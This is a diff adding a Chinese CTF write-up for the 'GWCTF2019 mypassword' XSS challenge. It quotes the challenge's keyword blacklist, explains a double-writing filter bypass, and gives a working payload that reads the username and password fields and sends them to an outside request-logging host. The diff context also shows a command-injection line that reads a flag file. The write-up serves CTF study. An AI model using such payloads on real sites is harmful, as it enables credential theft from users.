@@ -7857,3 +7857,65 @@ file "";head /fla*;"" ;
 >第三次输入2，因为和第二次输入相同，相当于模拟的ip不再变化，因此这个时候会在数据库中查找ip2的last ip，执行了查询操作，因此这个地方是我们的利用点了
 
 然后就是普通的盲注了。
+
+## GWCTF2019 mypassword(XSS)
+
+- 首页登录界面，查看源码发现注册页面，注册账号登录，发现留言界面`feedback.php`,留言列表`list.php`
+- 在登录注册页面fuzz了一下，发现过滤了所有特殊字符，而且登录后首页提示密码在源码里面，不存在注入，所以排除了SQL注入
+- 在feedback发现了注释的源码
+
+    ```php
+    if(is_array($feedback)){
+				echo "<script>alert('反馈不合法');</script>";
+				return false;
+			}
+			$blacklist = ['_','\'','&','\\','#','%','input','script','iframe','host','onload','onerror','srcdoc','location','svg','form','img','src','getElement','document','cookie'];
+			foreach ($blacklist as $val) {
+		        while(true){
+		            if(stripos($feedback,$val) !== false){
+		                $feedback = str_ireplace($val,"",$feedback);
+		            }else{
+		                break;
+		            }
+		        }
+		    }
+    ```
+
+    根据源码黑名单中的内容可以看出过滤的都是js的关键字，所以从这里可以判断出这道题目考点是XSS。而且这里的过滤采用的是非递归的替换过滤，直接可以采用双写绕过
+
+- 看网页源码的时候发现了一个js的文件
+
+    ```js
+    if (document.cookie && document.cookie != '') {
+        var cookies = document.cookie.split('; ');
+        var cookie = {};
+        for (var i = 0; i < cookies.length; i++) {
+            var arr = cookies[i].split('=');
+            var key = arr[0];
+            cookie[key] = arr[1];
+        }
+        if(typeof(cookie['user']) != "undefined" && typeof(cookie['psw']) != "undefined"){
+            document.getElementsByName("username")[0].value = cookie['user'];
+            document.getElementsByName("password")[0].value = cookie['psw'];
+        }
+    }
+    ```
+
+    可以发现用户名密码都存入cookie中
+
+- 构造payload把账号密码发送到XSS平台
+
+    ```xml
+    <inpcookieut type="text" name="username"></inpcookieut>
+    <inpcookieut type="text" name="password"></inpcookieut>
+    <scricookiept scookierc="./js/login.js"></scricookiept>
+    <scricookiept>
+        var uname = documcookieent.getElemcookieentsByName("username")[0].value;
+        var passwd = documcookieent.getElemcookieentsByName("password")[0].value;
+        var res = uname + " " + passwd;
+        documcookieent.locacookietion="http://http.requestbin.buuoj.cn/*/?a="+res;
+    </scricookiept>
+    <!-- 其中的url地址要填XSS平台中构造的地址 -->
+    ```
+
+    稍微等待一会就会得到密码，密码就是flag。
